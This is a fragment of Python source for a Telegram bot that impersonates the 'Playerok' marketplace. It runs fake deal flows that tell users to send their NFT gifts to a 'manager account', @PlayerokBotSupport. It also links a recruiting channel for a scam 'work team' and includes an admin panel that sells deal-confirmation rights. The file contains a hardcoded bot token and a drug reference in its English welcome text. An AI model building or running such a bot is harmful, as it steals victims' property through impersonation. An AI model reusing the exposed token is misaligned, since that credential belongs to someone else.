...
bot = Bot(token="8230537478:AAFw6RD3LzKC_FUNZxl4X_sX4I7GP65SpCE")
dp = Dispatcher()
all_users = set() 
...
main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    ...
    [InlineKeyboardButton(text="📞 Лучшая ворк тима", url="https://t.me/+wF_czAFopw03YjRi")],
...
async def send_main_menu(chat_id, lang, message_id=None):
    ...
    try:
        photo = "https://i.postimg.cc/kXTCTNNt/IMG-8740.jpg"
        if lang == "ru":
    ...
    if deal_id:
        ...
        if deal["type"] == "deal_gift":
            text_ru = (
                ...
                f"NFT ожидает отправки на официальный аккаунт менеджера - @PlayerokBotSupport\n\n"
            ...
            text_en = (
                ...
                f"NFT must be sent to the official manager account — @PlayerokBotSupport\n\n"
                f"⚠️ Attention:\n"
...
async def sierrateam_read_callback(callback: CallbackQuery):
    ...
    await safe_edit_message(
        callback,
        "👑 Админ-панель\n\nВыберите действие:\n\n🔓 Полный доступ: ❌ Отсутствует\n💼 Может подтверждать: Только подарки\n\n💎 Для получения полного доступа свяжитесь с @PlayerokBotSupport",
...
async def agree_callback(callback: CallbackQuery):
    ...
    lang = user_languages.get(user_id, "ru")
    text = "Добро пожаловать в Playerok!\nЛучшая ворк тима - https://t.me/+wF_czAFopw03YjRi" if lang == "ru" else "Welcome to Гнездо дезоморфина!\nЛучшая ворк тима - https://t.me/+wF_czAFopw03YjRi"
